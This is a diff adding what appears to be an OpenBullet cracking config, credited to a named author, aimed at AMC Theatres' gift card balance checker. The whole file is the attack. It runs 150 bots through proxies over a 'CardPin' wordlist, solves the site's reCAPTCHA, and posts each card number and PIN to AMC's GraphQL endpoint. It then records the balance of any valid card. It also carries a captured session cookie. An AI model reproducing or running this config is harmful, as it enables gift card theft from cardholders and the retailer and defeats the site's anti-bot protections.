@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "AMCGC",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-19T19:02:36.5452477+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "CardPin",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST REQUEST GET "https://www.amctheatres.com/gift-cards/check-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://www.amctheatres.com/gift-cards/check-balance" "6Ld3JBkUAAAAAKBiepEAQrofYLp4C-c1A6gPlJwa" -> VAR "RECAPTCHA" 
+#POST_REQUEST REQUEST POST "https://graph.amctheatres.com/" AutoRedirect=TRUE 
+  CONTENT "{\"operationName\":\"GiftCardContainer\",\"variables\":{\"captcha\":\"<RECAPTCHA>\",\"number\":\"<USER>\",\"pin\":\"<PASS>\",\"hasCardInfo\":true},\"query\":\"query GiftCardContainer($captcha: String!, $number: String!, $pin: String, $hasCardInfo: Boolean!) {\n  viewer {\n    giftCard(captcha: $captcha, number: $number, pin: $pin) @include(if: $hasCardInfo) {\n      ...GiftCardBalance_GiftCard\n      __typename\n    }\n    user {\n      id\n      account {\n        ...GiftCardLookup_Account\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment GiftCardBalance_GiftCard on GiftCard {\n  id\n  balance\n  __typename\n}\n\nfragment GiftCardLookup_Account on Account {\n  id\n  accountId\n  __typename\n}\n\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "Cookie: alreadyLanded=true; _ga=GA1.2.1872394112.1529011043; machine=%7B%22onboardingTourDismissed%22%3Atrue%7D; TS0149c298=01a483b97115890355a192fe03bd66cb24f5de31c599babb30e6859f970c2779397c290fc6ec639e8d4733fe2068c88637b3a01605; TS01e39824=01a483b971b35d47061dd81c3c945f20fa9d36ba1a39637eb30cbfb57779a2705514d985a4e71ff8c811c5319601bfa41c3e10ad104dca4c6e2bbaf08e62bd3c5ba0f76c88a9a56b146a9d1179740233253045d2bdd80c000891517bf8e275eca141f81cc4; _gid=GA1.2.313629011.1529413036; _gat_UA-24750557-1=1; pageCookie=/gift-cards/check-balance" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Referer: https://www.amctheatres.com/gift-cards/check-balance" 
+  HEADER "Origin: https://www.amctheatres.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"giftCard\":null" 
+  KEYCHAIN Success OR 
+    KEY "\"balance\":" 
+PARSE "<SOURCE>" LR "\"balance\":" "," Recursive=FALSE -> CAP "GC Balance" "" "" 
